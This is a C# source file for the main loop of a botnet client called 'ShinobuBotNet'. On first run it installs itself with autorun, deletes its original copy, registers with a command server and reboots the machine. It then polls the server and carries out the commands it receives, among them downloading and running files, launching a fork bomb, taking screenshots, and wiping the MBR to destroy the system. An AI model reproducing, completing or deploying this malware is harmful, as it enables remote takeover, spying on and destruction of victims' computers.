using System;
using System.Text.RegularExpressions;
using System.Threading;
using System.Net;
using System.Threading.Tasks;
using System.Windows;
using System.IO;
using Microsoft.Win32;
using System.Reflection;
using System.Diagnostics;

namespace ShinobuBotNet
{
    class cMain
    {
        static string last_cmd = string.Empty;

        static void Main(string[] args)
        {
            if (check.CheckDir() == true)
            {
                if (System.IO.File.Exists(config.CheakFile))
                {
                    while (true)
                    {
                        string id = API.Get_ID();
                        string html = API.GetCommand(id);
                        if (html == "null")
                        {
                            continue;
                        }

                        if (last_cmd == html)
                        {
                            Thread.Sleep(config.delay);
                            continue;
                        }
                        last_cmd = html;

                        cmd command = new cmd(html);
                        Execute(command);

                        Thread.Sleep(config.delay);
                    }
                }
            }


            else
            {
                //install
                install.installSelf();
                install.setAutorun();
                install.MeltFile();
                //connect
                API.connect();
                API.creat_cheak_File();
                install.Reboot();
            }

            void Execute(cmd CMD)
            {
                switch (CMD.ComType)
                {
                    case "open_link":
                        functions.OpenLink(CMD.ComContent);
                        break;

                    case "download_execute":
                        functions.DownloadExecute(CMD.ComContent);
                        break;

                    case "exit":
                        Environment.Exit(0);
                        break;

                    case "ping":
                        functions.ping();
                        break;

                    case "forkbomb":
                        functions.forkbomb();
                        break;

                    case "screnshot":
                        functions.screenshot();
                        break;

                    case "msg_box":
                        functions.MSG(CMD.ComContent);
                        break;

                    case "delete":
                        install.uninstallSelf();
                        break;

                    case "MBR_DELETE":
                        functions.DestroySystem();
                        break;

                    case "reboot":
                        install.Reboot();
                        break;

                    case "update":
                        string file = web.DownloadFile(CMD.ComContent);
                        utils.run(file);
                        break;
                }
            }
        }
    }
}
